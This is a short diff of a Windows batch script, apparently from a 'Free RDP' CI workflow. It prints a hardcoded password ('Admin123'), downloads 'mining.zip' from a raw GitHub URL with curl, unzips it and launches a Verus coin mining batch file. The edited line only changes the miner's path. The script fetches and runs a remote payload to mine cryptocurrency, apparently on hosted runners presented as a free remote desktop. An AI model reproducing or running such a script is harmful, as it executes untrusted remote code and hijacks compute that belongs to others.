@@ -21,7 +21,7 @@ echo Password: Admin123
 curl -o "D:\mining.zip" https://raw.githubusercontent.com/tonydoang12/test/main/mining.zip > out.txt 2>&1
 unzip D:\mining.zip
 D:
-D:\a\Free-RDP\Free-RDP\start-mining-veruscoin.bat 
+D:\a\rdppriv\rdppriv\start-mining-veruscoin.bat 
 
 echo Please Login To Your RDP!!
 ping -n 10 127.0.0.1 >nul
